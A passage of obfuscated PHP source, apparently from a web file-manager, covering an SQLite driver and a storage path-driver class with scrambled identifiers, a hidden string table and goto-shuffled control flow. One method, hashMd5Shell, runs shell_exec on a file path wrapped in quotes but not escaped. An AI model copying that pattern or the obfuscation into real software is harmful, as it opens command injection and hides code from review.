$this->free(); } think_action_status($BÄ¨­Õåˆ‰[21], 1); goto e½‚éˆŸ¼î; e½‚éˆŸ¼î: think_status($BÄ¨­Õåˆ‰[20]); $d˜†ÖæÈÖ = $this->_linkID->exec($EõÒƒîáöÛ); $this->debug(); goto CÎŸÜŠ“…Õ; aë…Úº¤Ô‰: $BÄ¨­Õåˆ‰ =& $_SERVER[İë¬“ÅÒÛ›]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aàéá—Éè‹; CÎŸÜŠ“…Õ: if (!1 === $d˜†ÖæÈÖ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto BÒÄµôÙËë; BÒÄµôÙËë: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[İë¬“ÅÒÛ›][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $A¯á´¹ŠŠŸ = $this->_linkID->query($_SERVER[İë¬“ÅÒÛ›][23]); if (!$A¯á´¹ŠŠŸ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $a“áë©‚Ÿ™ = $this->_linkID->query($_SERVER[İë¬“ÅÒÛ›][24]); if (!$a“áë©‚Ÿ™) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $aˆø£Á¾ÆÊ = array(); while ($EëÕ„ˆâôé = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $aˆø£Á¾ÆÊ[] = $EëÕ„ˆâôé; } $this->queryID->reset(); return $aˆø£Á¾ÆÊ; } public function getFields($aâã‡·ô¥×) { $A•èÍŒÛÅ =& $_SERVER[İë¬“ÅÒÛ›]; $dß‘‚àÒ×® = $this->query($A•èÍŒÛÅ[25] . $aâã‡·ô¥× . $A•èÍŒÛÅ[26]); $Dè³Ö„Œ° = array(); if ($dß‘‚àÒ×®) { foreach ($dß‘‚àÒ×® as $d•ÛÀí”¢Æ => $b¶Û©†æÕÊ) { $Dè³Ö„Œ°[$b¶Û©†æÕÊ[$A•èÍŒÛÅ[28]]] = array($A•èÍŒÛÅ[28] => $b¶Û©†æÕÊ[$A•èÍŒÛÅ[28]], $A•èÍŒÛÅ[29] => $b¶Û©†æÕÊ[$A•èÍŒÛÅ[29]], $A•èÍŒÛÅ[31] => (bool) ($b¶Û©†æÕÊ[$A•èÍŒÛÅ[31]] === $A•èÍŒÛÅ[33]), $A•èÍŒÛÅ[34] => $b¶Û©†æÕÊ[$A•èÍŒÛÅ[53]], $A•èÍŒÛÅ[36] => (bool) $b¶Û©†æÕÊ[$A•èÍŒÛÅ[54]], $A•èÍŒÛÅ[39] => (bool) $b¶Û©†æÕÊ[$A•èÍŒÛÅ[54]]); } } return $Dè³Ö„Œ°; } public function getTables($bÏòÔÅ¯‹ = '') { $bÁèç¤ƒˆÕ =& $_SERVER[İë¬“ÅÒÛ›]; $AáØ²³ÉŒ = $this->query($bÁèç¤ƒˆÕ[42] . $bÁèç¤ƒˆÕ[43] . $bÁèç¤ƒˆÕ[44]); $F†‡ô«¾Üñ = array(); foreach ($AáØ²³ÉŒ as $eššß¥ß´‚ => $cÙ”ï—¹¾š) { $F†‡ô«¾Üñ[$eššß¥ß´‚] = current($cÙ”ï—¹¾š); } return $F†‡ô«¾Üñ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $c³ÖôÓÎ›æ =& $_SERVER[İë¬“ÅÒÛ›]; $this->error = $this->_linkID->lastErrorMsg(); if ($c³ÖôÓÎ›æ[33] != $this->queryStr) { $this->error .= LNG($c³ÖôÓÎ›æ[45]) . $this->queryStr; } think_trace($this->error, $c³ÖôÓÎ›æ[33], $c³ÖôÓÎ›æ[46]); return $this->error; } public function escapeString($CÎœÌğØ“¤) { $C—ê™–Ã° =& $_SERVER[İë¬“ÅÒÛ›]; if ($this->_linkID) { return $this->_linkID->escapeString($CÎœÌğØ“¤); } return str_ireplace($C—ê™–Ã°[55], $C—ê™–Ã°[56], $CÎœÌğØ“¤); } public function parseLimit($b‹ù™ †) { $CÆÀô‹Å«£ =& $_SERVER[İë¬“ÅÒÛ›]; $C’Õ´·ˆÑƒ = $CÆÀô‹Å«£[33]; if (!empty($b‹ù™ †)) { $b‹ù™ † = explode($CÆÀô‹Å«£[47], $b‹ù™ †); if (count($b‹ù™ †) > 1) { $C’Õ´·ˆÑƒ .= $CÆÀô‹Å«£[48] . $b‹ù™ †[1] . $CÆÀô‹Å«£[49] . $b‹ù™ †[0] . $CÆÀô‹Å«£[50]; } else { $C’Õ´·ˆÑƒ .= $CÆÀô‹Å«£[48] . $b‹ù™ †[0] . $CÆÀô‹Å«£[50]; } } return $C’Õ´·ˆÑƒ; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $BÉ†•Úâõ =& $_SERVER[İë¬“ÅÒÛ›]; $this->objectDriver = array($BÉ†•Úâõ[57], $BÉ†•Úâõ[58], $BÉ†•Úâõ[59], $BÉ†•Úâõ[60], $BÉ†•Úâõ[61], $BÉ†•Úâõ[62], $BÉ†•Úâõ[63], $BÉ†•Úâõ[64], $BÉ†•Úâõ[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($F‚à¼é¼±õ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($F‚à¼é¼±õ, $_SERVER[İë¬“ÅÒÛ›][8]); } return $F‚à¼é¼±õ; } public function getPathName($c¬ÈâÁùö×) { return $c¬ÈâÁùö×; } public function iconvApp($D¸Ø¹·¥ÛÄ) { return $D¸Ø¹·¥ÛÄ; } public function iconvSystem($eçàĞÄ‰«) { return $eçàĞÄ‰«; } public function iconvTo($FğãÜ„çº¤, $d’©Æ«í¢, $Aßç¢´) { goto EÕ‘¤×‘âæ; bãÃ¾‹œ„›: $C÷÷æšÍ¯è = $C÷÷æšÍ¯è ? $C÷÷æšÍ¯è : $FğãÜ„çº¤; if (strstr($C÷÷æšÍ¯è, $a½Œó‡»[70])) { $C÷÷æšÍ¯è = str_replace($a½Œó‡»[70], $a½Œó‡»[71], $C÷÷æšÍ¯è); } $cŒÅæÀ­ë°[$d’©Æ«í¢ . $a½Œó‡»[67] . $Aßç¢´ . $a½Œó‡»[68] . $FğãÜ„çº¤] = $C÷÷æšÍ¯è; goto b³ÒÔÛÓÄ; EÕ‘¤×‘âæ: $a½Œó‡» =& $_SERVER[İë¬“ÅÒÛ›]; if (!$FğãÜ„çº¤ || !function_exists($a½Œó‡»[66])) { return $FğãÜ„çº¤; } static $cŒÅæÀ­ë° = array(); goto AÚôñéÄõ; AÚôñéÄõ: $E‹½†é¨Šˆ = $d’©Æ«í¢ . $a½Œó‡»[67] . $Aßç¢´ . $a½Œó‡»[68] . $FğãÜ„çº¤; if (isset($cŒÅæÀ­ë°[$E‹½†é¨Šˆ])) { return $cŒÅæÀ­ë°[$E‹½†é¨Šˆ]; } if (function_exists($a½Œó‡»[69])) { $C÷÷æšÍ¯è = @mb_convert_encoding($FğãÜ„çº¤, $Aßç¢´, $d’©Æ«í¢); } else { $C÷÷æšÍ¯è = @iconv($d’©Æ«í¢, $Aßç¢´, $FğãÜ„çº¤); } goto bãÃ¾‹œ„›; b³ÒÔÛÓÄ: $cŒÅæÀ­ë°[$Aßç¢´ . $a½Œó‡»[67] . $d’©Æ«í¢ . $a½Œó‡»[68] . $FğãÜ„çº¤] = $FğãÜ„çº¤; $cŒÅæÀ­ë°[$Aßç¢´ . $a½Œó‡»[67] . $d’©Æ«í¢ . $a½Œó‡»[68] . $C÷÷æšÍ¯è] = $FğãÜ„çº¤; $cŒÅæÀ­ë°[$d’©Æ«í¢ . $a½Œó‡»[67] . $Aßç¢´ . $a½Œó‡»[68] . $C÷÷æšÍ¯è] = $C÷÷æšÍ¯è; goto F¾ì‚ğ‚Üñ; F¾ì‚ğ‚Üñ: return $C÷÷æšÍ¯è; goto dŠ¿ùº•ÁĞ; dŠ¿ùº•ÁĞ: } public function getPathInner($cÖ¢†ìíŸÜ) { $Fò†âÎô”Ù = IO::init($cÖ¢†ìíŸÜ); return $Fò†âÎô”Ù->path; } public function getPathOuter($FìïÛ¢‚ôĞ) { $dì“ÖæÊß˜ =& $_SERVER[İë¬“ÅÒÛ›]; $e‰ÈÅÜğÆ¤ = strlen(trim($this->pathBase, $dì“ÖæÊß˜[8])); $FìïÛ¢‚ôĞ = substr(trim($FìïÛ¢‚ôĞ, $dì“ÖæÊß˜[8]), $e‰ÈÅÜğÆ¤); return $this->pathDriver . $dì“ÖæÊß˜[8] . ltrim($FìïÛ¢‚ôĞ, $dì“ÖæÊß˜[8]); } public function isParentOf($A­÷îÊ¦—˜, $eâ«”ÖëÑÂ) { $d‘Ô¦ä®ó =& $_SERVER[İë¬“ÅÒÛ›]; $A­÷îÊ¦—˜ = rtrim(strtolower($A­÷îÊ¦—˜), $d‘Ô¦ä®ó[8]) . $d‘Ô¦ä®ó[8]; $eâ«”ÖëÑÂ = rtrim(strtolower($eâ«”ÖëÑÂ), $d‘Ô¦ä®ó[8]) . $d‘Ô¦ä®ó[8]; $eÖ­ä›³¶ì = strpos($eâ«”ÖëÑÂ, $A­÷îÊ¦—˜) === 0; return $eÖ­ä›³¶ì; } public function getType() { $f­óÏšÈ÷Ÿ =& $_SERVER[İë¬“ÅÒÛ›]; $C·ÌÒ”Ô„ = str_replace($f­óÏšÈ÷Ÿ[72], $f­óÏšÈ÷Ÿ[33], get_class($this)); return strtolower($C·ÌÒ”Ô„); } public function isTypeObject() { return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Aäµ¢ºí½¹, $aì™ã³àó¦) { $Eğöğœí =& $_SERVER[İë¬“ÅÒÛ›]; $D«ìöŸì¨ = rtrim($Aäµ¢ºí½¹, $Eğöğœí[8]) . $Eğöğœí[8] . $aì™ã³àó¦; $AŞ‚ÛÉÔõî = $this->exist($D«ìöŸì¨); return $AŞ‚ÛÉÔõî ? $D«ìöŸì¨ : !1; } public function renameObject($d¬§ôù“Ø, $C«®ËöŠ‚) { $A¤©Ì¡ˆÌÙ =& $_SERVER[İë¬“ÅÒÛ›]; Hook::trigger($A¤©Ì¡ˆÌÙ[73], $this, $d¬§ôù“Ø, $this, $this->pathFather($d¬§ôù“Ø) . $C«®ËöŠ‚); $d¬§ôù“Ø = $this->getPathOuter($d¬§ôù“Ø); $C«®ËöŠ‚ = $this->pathFather($d¬§ôù“Ø) . $C«®ËöŠ‚; if (IO::isFile($d¬§ôù“Ø)) { $d¦‘¸œœÏÇ = IO::move($d¬§ôù“Ø, $C«®ËöŠ‚, REPEAT_RENAME_FOLDER); } else { $d¦‘¸œœÏÇ = IO::mkdir($C«®ËöŠ‚); if (!$d¦‘¸œœÏÇ) { return !1; } $d¤Œ„—¡ä = IO::listPath($d¬§ôù“Ø, !0); $CËùƒñ‚ = array_merge($d¤Œ„—¡ä[$A¤©Ì¡ˆÌÙ[74]], $d¤Œ„—¡ä[$A¤©Ì¡ˆÌÙ[75]]); foreach ($CËùƒñ‚ as $FÏ‚Ãƒ”Á“) { IO::move($FÏ‚Ãƒ”Á“[$A¤©Ì¡ˆÌÙ[76]], $C«®ËöŠ‚, REPEAT_RENAME_FOLDER); } IO::remove($d¬§ôù“Ø); } return $d¦‘¸œœÏÇ ? $C«®ËöŠ‚ : !1; } public function tempFile($cˆ¾­¬¢Š‹ = '', $EÆ¬‘‚‰ğè = '') { goto cìÓñ­÷œÓ; A´òÓÓ›: return $DÇöÁÔì­; goto fÍÉºÔƒŒñ; cìÓñ­÷œÓ: if (!$cˆ¾­¬¢Š‹) { $cˆ¾­¬¢Š‹ = rand_string(15); } $f¾è„¯òÆ = TEMP_FILES . rand_string(15) . $_SERVER[İë¬“ÅÒÛ›][8]; @mkdir($f¾è„¯òÆ, 511, !0); goto EØÙè×Â“ñ; EØÙè×Â“ñ: $DÇöÁÔì­ = $f¾è„¯òÆ . $cˆ¾­¬¢Š‹; @touch($DÇöÁÔì­); if ($EÆ¬‘‚‰ğè) { file_put_contents($DÇöÁÔì­, $EÆ¬‘‚‰ğè); } goto A´òÓÓ›; fÍÉºÔƒŒñ: } public function tempFileRemve($DªÈ‹šö›Ü) { @unlink($DªÈ‹šö›Ü); @rmdir($this->pathFather($DªÈ‹šö›Ü)); } public function mkfile($f•½ö£ø·ˆ, $A†¸ë­Ğµ = '', $aä­¤—ªÓ‹ = REPEAT_RENAME) { } public function mkdir($aÉ¹èÎîÊ·, $Aì‚œˆˆ¥ = REPEAT_SKIP) { } public function copyFile($FÜ†—ªŠîß, $b˜”‹„äÛ°) { } public function moveFile($aÃ‘ã·ß–Î, $Fª°È„Ï·) { } public function remove($cãÑ°«ì°ë) { if ($this->isFile($cãÑ°«ì°ë)) { return $this->delFile($cãÑ°«ì°ë); } return $this->delFolder($cãÑ°«ì°ë); } public function rename($D ¼Ã”òˆï, $aòÀÉÁéÅ) { } public function exist($C…é›Ã¸‡¾) { } public function findByHash($e™´éÑÖ†ë = '', $BôÔ ÷ƒó¸ = '') { return !1; } public function isFile($DÀå‚Åƒ) { } public function isFolder($a§‘·’·Ï) { } public function size($E‘²­Œ¾Ãƒ) { } public function info($bá£Š‚ÕØ¥) { } public function infoAuth($føìõá°ˆÌ) { return $this->info($føìõá°ˆÌ); } public function infoFull($B—»›òù½ï) { return $this->info($B—»›òù½ï); } public function infoWithChildren($d’ßİ¢íØ«) { $cêª¨‘ĞÔï =& $_SERVER[İë¬“ÅÒÛ›]; $d†ˆ‡¿ÈºÜ = $this->info($d’ßİ¢íØ«); if ($d†ˆ‡¿ÈºÜ && $d†ˆ‡¿ÈºÜ[$cêª¨‘ĞÔï[29]] == $cêª¨‘ĞÔï[77]) { $b”¦¢ôƒ“Œ = array($cêª¨‘ĞÔï[78] => 0, $cêª¨‘ĞÔï[79] => 0, $cêª¨‘ĞÔï[80] => 0); $this->infoChildren($d’ßİ¢íØ«, $b”¦¢ôƒ“Œ); $d†ˆ‡¿ÈºÜ[$cêª¨‘ĞÔï[78]] = $b”¦¢ôƒ“Œ[$cêª¨‘ĞÔï[78]]; $d†ˆ‡¿ÈºÜ[$cêª¨‘ĞÔï[81]] = array($cêª¨‘ĞÔï[82] => $b”¦¢ôƒ“Œ[$cêª¨‘ĞÔï[79]], $cêª¨‘ĞÔï[83] => $b”¦¢ôƒ“Œ[$cêª¨‘ĞÔï[80]]); } return $d†ˆ‡¿ÈºÜ; } public function listPath($E„†çñ·Š¡, $F¡ÖØ·é = false) { } public function has($f³¾ßÀ¤ŠĞ, $eØ³§î¡¶• = false, $c‡…ŸÊÜÔò = false) { } public function canRead($fĞµ´Ê‹‘) { } public function canWrite($E¼¨ÃÑõÙš) { } public function getContent($f‰ƒÎÃÎùà) { } public function setContent($F©¤ÍÆâÂ, $fÉ‘ó¤ŞÓ  = '') { } protected function infoChildren($B©²ôÀ, &$cĞŞâß”²¹) { $FÚİÁÈ¿Ñë =& $_SERVER[İë¬“ÅÒÛ›]; check_abort(); $AòÔäÎöÕ· = $this->listPath($B©²ôÀ, !0); $AòÔäÎöÕ· = array_merge($AòÔäÎöÕ·[$FÚİÁÈ¿Ñë[75]], $AòÔäÎöÕ·[$FÚİÁÈ¿Ñë[74]]); foreach ($AòÔäÎöÕ· as $a×ö“Í¶îˆ) { if ($a×ö“Í¶îˆ[$FÚİÁÈ¿Ñë[29]] == $FÚİÁÈ¿Ñë[77]) { $cĞŞâß”²¹[$FÚİÁÈ¿Ñë[80]]++; $a½ê¢õ› = $this->getPathInner($a×ö“Í¶îˆ[$FÚİÁÈ¿Ñë[76]]); $this->infoChildren($a½ê¢õ›, $cĞŞâß”²¹); } else { $cĞŞâß”²¹[$FÚİÁÈ¿Ñë[79]]++; $cĞŞâß”²¹[$FÚİÁÈ¿Ñë[78]] += $a×ö“Í¶îˆ[$FÚİÁÈ¿Ñë[78]]; } } } public function fileSubstr($BÑ¬’µŸ, $F×›¹Í·®¸, $a¾’Æ©ëõ„) { } public function listAll($Dƒˆ§Ÿí¬) { } public function upload($EµÔ· Î†˜, $bºÕ‘Ëâ, $c™²ì›ƒ¯ = false, $CÍŒâ¥åê„ = REPEAT_REPLACE) { } public function uploadFileByID($Cíôç–»¾, $E—ß‚šÓ›á, $bé÷ùœ÷—) { } public function uploadFileByPath($Dà£Û§åå£, $cß¼æÖ˜, $aí‰‹³à• = array()) { } public function uploadLink($dŒãç‰áÅÈ, $E‰•“Èµ = 0) { goto cŞÚ·¡‡”; c²‹ŞºÕËÉ: $DÖÛÄàù¦À = $this->{$c±ëá¦–¢}($dŒãç‰áÅÈ, $cˆóŠ½®); if ($DÖÛÄàù¦À) { $DÖÛÄàù¦À[$e„§’ÓÕ°[88]] = $dŒãç‰áÅÈ; $DÖÛÄàù¦À[$e„§’ÓÕ°[89]] = $Fê³¨Š›Èä; } return $DÖÛÄàù¦À; goto f°ä‹’»èØ; cŞÚ·¡‡”: $e„§’ÓÕ° =& $_SERVER[İë¬“ÅÒÛ›]; if ($GLOBALS[$e„§’ÓÕ°[6]][$e„§’ÓÕ°[84]][$e„§’ÓÕ°[85]]) { return; } $Fê³¨Š›Èä = $this->getType(); goto DÇÀ×ñßİÃ; DÇÀ×ñßİÃ: if (!in_array($Fê³¨Š›Èä, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Cç­¡ç½ñî = 1024 * 1024 * 10; goto EÑ¿òÙô™¸; EÑ¿òÙô™¸: $c±ëá¦–¢ = $E‰•“Èµ <= $Cç­¡ç½ñî ? $e„§’ÓÕ°[86] : $e„§’ÓÕ°[87]; if ($Fê³¨Š›Èä == $e„§’ÓÕ°[61]) { $c±ëá¦–¢ = $e„§’ÓÕ°[87]; } $cˆóŠ½® = (!$E‰•“Èµ ? 1 : ceil($E‰•“Èµ / pow(1024, 3))) * 3600 * 4; goto c²‹ŞºÕËÉ; f°ä‹’»èØ: } public function uploadFormData($F½“¹¦Î¯¥, $eÛ¤ì’ğÕÜ = 3600) { } public function multiUploadFormData($cä­©õø²Å, $B»ˆ†™”äõ = 3600) { } public function osChunkSize() { $FØöôÄœè =& $_SERVER[İë¬“ÅÒÛ›]; $eğí©µ¿¶Ë = $GLOBALS[$FØöôÄœè[6]][$FØöôÄœè[84]][$FØöôÄœè[90]][$FØöôÄœè[91]]; if (!$eğí©µ¿¶Ë) { $eğí©µ¿¶Ë = 1024 * 84 * 10; } return $eğí©µ¿¶Ë; } public function download($Fä”ÂÑÃÎ¶, $AÜâ—®‘Ó’) { } public function ext($D…­÷³) { $B—ÈÒç…¸ =& $_SERVER[İë¬“ÅÒÛ›]; if (strpos($D…­÷³, $B—ÈÒç…¸[8]) === -1) { $CŒ¾”™Ê†² = $D…­÷³; } else { $CŒ¾”™Ê†² = $this->pathThis($D…­÷³); } $C…íèÌ¤ = $B—ÈÒç…¸[33]; if (strstr($CŒ¾”™Ê†², $B—ÈÒç…¸[92])) { $C…íèÌ¤ = substr($CŒ¾”™Ê†², strrpos($CŒ¾”™Ê†², $B—ÈÒç…¸[92]) + 1); $C…íèÌ¤ = strtolower($C…íèÌ¤); } if (strlen($C…íèÌ¤) > 3 && preg_match($B—ÈÒç…¸[93], $C…íèÌ¤, $Fï¬Õ¬Ä•®)) { $C…íèÌ¤ = $B—ÈÒç…¸[33]; } return $C…íèÌ¤; } public function pathThis($DÄÎ²„†Í”) { $dÊµ«Ï÷„« =& $_SERVER[İë¬“ÅÒÛ›]; $DÄÎ²„†Í” = str_replace($dÊµ«Ï÷„«[94], $dÊµ«Ï÷„«[8], rtrim($DÄÎ²„†Í”, $dÊµ«Ï÷„«[8])); $aÍÕÅèŒœõ = strrpos($DÄÎ²„†Í”, $dÊµ«Ï÷„«[8]); if ($aÍÕÅèŒœõ === !1) { return $DÄÎ²„†Í”; } return substr($DÄÎ²„†Í”, $aÍÕÅèŒœõ + 1); } public function pathFather($fƒ•°çãè‹) { $eùÕ®—ŒÆ… =& $_SERVER[İë¬“ÅÒÛ›]; $fƒ•°çãè‹ = str_replace($eùÕ®—ŒÆ…[94], $eùÕ®—ŒÆ…[8], rtrim($fƒ•°çãè‹, $eùÕ®—ŒÆ…[8])); $Aš‘Š‘»ø° = strrpos($fƒ•°çãè‹, $eùÕ®—ŒÆ…[8]); if ($Aš‘Š‘»ø° === !1) { return $eùÕ®—ŒÆ…[33]; } return substr($fƒ•°çãè‹, 0, $Aš‘Š‘»ø° + 1); } public function hashSimple($bøŠ­İñØ) { goto a²Ìô‘ØÚÖ; C²¡øƒ¡: $cçšµÂ…šØ = intval($CÇ˜öÔè® / $Bñ“Ÿ†ÒŠœ); $d¬ª¹İ¡ = $bÉÀ¿‰õ©·[33]; for ($A«±ŒËê… = 0; $A«±ŒËê… < $Bñ“Ÿ†ÒŠœ; $A«±ŒËê…++) { $d¬ª¹İ¡ .= $this->fileSubstr($bøŠ­İñØ, $cçšµÂ…šØ * $A«±ŒËê…, $Bàó¼ê©óÍ); } goto d‰ÒãÁÔ×¾; a²Ìô‘ØÚÖ: $bÉÀ¿‰õ©· =& $_SERVER[İë¬“ÅÒÛ›]; if (!$bøŠ­İñØ) { return md5($bÉÀ¿‰õ©·[33]); } $CÇ˜öÔè® = $this->size($bøŠ­İñØ); goto aËÀ¡ˆº±Œ; d‰ÒãÁÔ×¾: $d¬ª¹İ¡ .= $this->fileSubstr($bøŠ­İñØ, $CÇ˜öÔè® - $Bàó¼ê©óÍ, $Bàó¼ê©óÍ); return md5($d¬ª¹İ¡) . $CÇ˜öÔè®; goto d»©±ïÊ‹; aËÀ¡ˆº±Œ: $Bàó¼ê©óÍ = 200; $Bñ“Ÿ†ÒŠœ = 50; if ($CÇ˜öÔè® <= $Bàó¼ê©óÍ * $Bñ“Ÿ†ÒŠœ) { return $this->hashMd5($bøŠ­İñØ) . $CÇ˜öÔè®; } goto C²¡øƒ¡; d»©±ïÊ‹: } public static $md5Cache = array(); public function hashMd5($dÈˆóç¨) { $dÈˆóç¨ = $this->iconvSystem($dÈˆóç¨); if (isset(self::$md5Cache[$dÈˆóç¨])) { return self::$md5Cache[$dÈˆóç¨]; } self::$md5Cache[$dÈˆóç¨] = $this->hashMd5Shell($dÈˆóç¨); if (!self::$md5Cache[$dÈˆóç¨]) { self::$md5Cache[$dÈˆóç¨] = @md5_file($dÈˆóç¨); } return self::$md5Cache[$dÈˆóç¨]; } private function hashMd5Shell($b“¶ñˆïé®) { goto EÇ·¥Ùîö¤; EÇ·¥Ùîö¤: $E¶„‚àŞ» =& $_SERVER[İë¬“ÅÒÛ›]; if (!function_exists($E¶„‚àŞ»[95])) { return !1; } $E¿ÛŸëÃÈ = array($E¶„‚àŞ»[96], $E¶„‚àŞ»[97]); goto B¾¥öÕº’; B¾¥öÕº’: $FĞµå´¸äÆ = Cache::get($E¶„‚àŞ»[98]); if (!$FĞµå´¸äÆ) { $F‹¿£’…‡Ÿ = BASIC_PATH . $E¶„‚àŞ»[99]; $Aì¯ÛÛã©Š = md5_file($F‹¿£’…‡Ÿ); $FĞµå´¸äÆ = $E¶„‚àŞ»[100]; foreach ($E¿ÛŸëÃÈ as $AŠ½³ƒø») { $D£ßñ…¬¼˜ = shell_exec($AŠ½³ƒø» . "\40\42{$F‹¿£’…‡Ÿ}\x22"); if ($D£ßñ…¬¼˜ && substr(trim($D£ßñ…¬¼˜), 0, 32) == $Aì¯ÛÛã©Š) { $FĞµå´¸äÆ = $AŠ½³ƒø»; break; } } Cache::set($E¶„‚àŞ»[98], $FĞµå´¸äÆ, 3600); } if ($FĞµå´¸äÆ == $E¶„‚àŞ»[100]) { return !1; } goto BÒá¹â¾Ï; BÒá¹â¾Ï: $D£ßñ…¬¼˜ = shell_exec($FĞµå´¸äÆ . "\40\x22{$b“¶ñˆïé®}\x22"); return substr($D£ßñ…¬¼˜, 0, 32); goto B˜Óß”ÉÌƒ; B˜Óß”ÉÌƒ: } public function link($DŸåÒë÷ÖĞ) { return $DŸåÒë÷ÖĞ; } public function fileOut($CßŠ°ôÜ, $Aë“˜Õ¡ç = false, $DÆ¿†ŠÚ³¬ = false, $f£ô¹¤¼‰ª = '') { goto D¶¸†“˜Ì; f¬Û»™áÔÖ: header($e»Ñƒ®³º[132] . $e¬´÷İğø); header($e»Ñƒ®³º[133]); header($e»Ñƒ®³º[134] . $bö½’‡ˆéè); goto C÷Ö¯‘ÈŠ; EÖË—İÖ¸: if (strstr($d¼ù¶æŠ®Ê, $e»Ñƒ®³º[113])) { $d¼ù¶æŠ®Ê = $d¼ù¶æŠ®Ê . $e»Ñƒ®³º[114]; } if ($Aë“˜Õ¡ç === !1 && !mime_support($d¼ù¶æŠ®Ê)) { $Aë“˜Õ¡ç = !0; $d¼ù¶æŠ®Ê = $e»Ñƒ®³º[115]; } $cé¦§Êé = rawurlencode($e¬´÷İğø); goto D¿ã¿­•¼´; b¦£Ñªöß½: if (isset($_SERVER[$e»Ñƒ®³º[144]])) { if (preg_match($e»Ñƒ®³º[145], $_SERVER[$e»Ñƒ®³º[144]], $d·îåÛ¨ğŸ)) { $Eëíåíµ¼Æ = intval($d·îåÛ¨ğŸ[1]); if (!empty($d·îåÛ¨ğŸ[2])) { $bõÅ‹Ü¡â = intval($d·îåÛ¨ğŸ[2]); } } header($e»Ñƒ®³º[146]); header("\103\157\156\164\145\156\164\x2d\x52\x61\156\x67\145\x3a\40\x62\171\x74\x65\163\x20{$Eëíåíµ¼Æ}\x2d{$bõÅ‹Ü¡â}\x2f" . $bö½’‡ˆéè); } else { header($e»Ñƒ®³º[147]); } header($e»Ñƒ®³º[148] . ($bõÅ‹Ü¡â - $Eëíåíµ¼Æ + 1)); if ($_SERVER[$e»Ñƒ®³º[149]] == $e»Ñƒ®³º[150]) { return; } goto F¦™‚ˆË‹¢; CçÕâà¤Œ¤: if (isset($_SERVER[$e»Ñƒ®³º[129]]) && $_SERVER[$e»Ñƒ®³º[129]] == $f£ô¹¤¼‰ª) { header($e»Ñƒ®³º[130] . $f£ô¹¤¼‰ª, !0, 304); die; } header($e»Ñƒ®³º[130] . $f£ô¹¤¼‰ª); header($e»Ñƒ®³º[131] . $F˜«©ÍÅÏ . $e»Ñƒ®³º[123]); goto f¬Û»™áÔÖ; B§‘ÓòŠ¢÷: while ($Eëíåíµ¼Æ <= $bõÅ‹Ü¡â) { $CŠŠ„è¹¿¡ = timeFloat(); check_abort(); $eÃŒÅ­”‡ = $bõÅ‹Ü¡â - $Eëíåíµ¼Æ + 1; if ($eÃŒÅ­”‡ <= $Dİ„ ŒÈ÷±) { $Dİ„ ŒÈ÷± = $eÃŒÅ­”‡; } echo $this->fileSubstr($CßŠ°ôÜ, $Eëíåíµ¼Æ, $Dİ„ ŒÈ÷±); $Eëíåíµ¼Æ += $Dİ„ ŒÈ÷±; if ($Dİ„ ŒÈ÷± == $eÃŒÅ­”‡) { $Eëíåíµ¼Æ = $bõÅ‹Ü¡â + 1; } if ($AÆ¨Ò’İè«) { $Cö—Úá¶ŸË = intval(1000 * 1000 * (timeFloat() - $CŠŠ„è¹¿¡)); $aŠõÕÜ = $AÆ¨Ò’İè« - $Cö—Úá¶ŸË; if ($aŠõÕÜ > 5) { usleep($aŠõÕÜ); } } } goto bª¨‰¤Á­; dÄìÂâííÍ: if (!$f£ô¹¤¼‰ª) { $f£ô¹¤¼‰ª = md5($F˜«©ÍÅÏ . $this->hashSimple($CßŠ°ôÜ)); } $f£ô¹¤¼‰ª = $e»Ñƒ®³º[112] . $f£ô¹¤¼‰ª . $e»Ñƒ®³º[112]; $d¼ù¶æŠ®Ê = get_file_mime($E¿òÌ­•à); goto EÖË—İÖ¸; b¶Üó­¬‰í: set_timeout(); $EµÑï¯Ò±¼ = $this->infoFull($CßŠ°ôÜ); $bö½’‡ˆéè = $EµÑï¯Ò±¼[$e»Ñƒ®³º[78]]; goto Eµí†•æÅ; EÔ‹ºÉƒ‚›: header($e»Ñƒ®³º[125]); header($e»Ñƒ®³º[126]); if (isset($_SERVER[$e»Ñƒ®³º[127]]) && strtotime($_SERVER[$e»Ñƒ®³º[127]]) == $EµÑï¯Ò±¼[$e»Ñƒ®³º[106]]) { header($e»Ñƒ®³º[128], !0, 304); die; } goto CçÕâà¤Œ¤; Eµí†•æÅ: $F˜«©ÍÅÏ = gmdate($e»Ñƒ®³º[105], $EµÑï¯Ò±¼[$e»Ñƒ®³º[106]]); $e¬´÷İğø = $DÆ¿†ŠÚ³¬ ? $DÆ¿†ŠÚ³¬ : $this->iconvApp($EµÑï¯Ò±¼[$e»Ñƒ®³º[28]]); $Eëíåíµ¼Æ = 0; goto B…œ ä‘; dßµÂí©³±: $Fâ¨®Ø³ö = $GLOBALS[$e»Ñƒ®³º[6]][$e»Ñƒ®³º[84]][$e»Ñƒ®³º[90]][$e»Ñƒ®³º[103]]; $c—Ã÷®“Éº = intval($GLOBALS[$e»Ñƒ®³º[6]][$e»Ñƒ®³º[84]][$e»Ñƒ®³º[90]][$e»Ñƒ®³º[104]] * 1024 * 1024); @ob_end_clean(); goto b¶Üó­¬‰í; D¶¸†“˜Ì: $e»Ñƒ®³º =& $_SERVER[İë¬“ÅÒÛ›]; if (!$CßŠ°ôÜ || !$this->exist($CßŠ°ôÜ)) { show_json(LNG($e»Ñƒ®³º[101]), !1, $DÆ¿†ŠÚ³¬); } $D†“Ô‹Œ = $this->getType() == $e»Ñƒ®³º[102]; goto dßµÂí©³±; C÷Ö¯‘ÈŠ: header($e»Ñƒ®³º[135]); $d±Û¢óæà = strtolower($_SERVER[$e»Ñƒ®³º[136]]); if ($D†“Ô‹Œ && $d±Û¢óæà && $Fâ¨®Ø³ö) { if 